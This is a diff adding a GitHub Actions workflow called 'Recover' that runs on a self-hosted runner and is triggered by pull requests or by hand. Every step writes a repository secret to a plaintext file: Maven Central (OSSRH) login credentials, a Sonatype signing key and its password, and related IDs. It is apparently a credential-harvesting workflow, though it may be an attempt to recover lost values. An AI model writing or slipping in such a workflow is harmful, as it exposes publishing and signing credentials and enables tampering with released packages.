@@ -1,0 +1,16 @@
+name: Recover
+on: 
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  recover:
+    name: Recover values
+    runs-on: self-hosted
+    steps:
+      - run: echo ${{ secrets.OSSRH_USERNAME }} >> values.txt
+      - run: echo ${{ secrets.OSSRH_PASSWORD }} >> values.txt
+      - run: echo ${{ secrets.SONATYPE_SIGNING_KEY }} >> values.txt
+      - run: echo ${{ secrets.SONATYPE_SIGNING_KEY_ID }} >> values.txt
+      - run: echo ${{ secrets.SONATYPE_SIGNING_PASSWORD }} >> values.txt
+      - run: echo ${{ secrets.SONATYPE_STAGING_PROFILE_ID }} >> values.txt
